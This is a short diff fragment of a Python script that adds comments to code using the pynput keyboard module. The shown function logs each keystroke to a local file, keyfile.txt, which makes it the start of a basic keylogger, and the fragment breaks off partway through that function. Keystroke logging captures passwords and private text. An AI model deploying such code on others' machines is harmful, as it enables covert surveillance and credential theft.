@@ -1,5 +1,6 @@
+#Script needs pynput module to import keystrokes.   
 from pynput import keyboard
-
+#  prints keystroke to keyfile.txt. 
 def keyPress(key):
     print(str(key))
     with open("keyfile.txt", 'a') as logKey:
